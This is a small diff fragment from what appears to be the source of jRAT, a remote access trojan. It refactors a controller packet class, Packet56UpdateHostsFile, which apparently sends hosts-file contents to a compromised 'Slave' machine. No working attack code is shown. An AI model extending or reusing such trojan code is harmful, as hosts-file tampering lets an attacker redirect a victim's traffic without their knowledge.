@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet56UpdateHostsFile extends AbstractOutgoingPacket {
+public class Packet56UpdateHostsFile implements OutgoingPacket {
 
 	private String content;
 
